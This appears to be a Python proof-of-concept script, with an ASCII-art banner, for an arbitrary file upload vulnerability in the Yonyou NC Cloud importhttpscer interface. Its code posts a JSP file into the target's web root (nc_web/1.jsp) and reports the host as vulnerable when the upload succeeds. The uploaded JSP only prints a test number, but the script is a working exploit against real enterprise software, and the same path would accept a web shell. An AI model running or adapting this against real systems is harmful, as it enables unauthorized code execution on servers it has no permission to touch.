               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 用友NC Cloud importhttpscer接口存在任意文件上传漏洞 poc
...
def poc(target):
    ...
    files = {
        'file': ('./webapps/nc_web/1.jsp', '<%out.println(1111*1111);%>', 'text/plain')
    }
    ...
    try:
        ...
        response1 = requests.post(url=url, headers=headers, files=files, verify=False, timeout=15)

        if  response1.status_code == 200 and "success" in response1.text:
            print(f"[++++++] {target} 存在任意文件上传，地址为{target}/1.jsp")
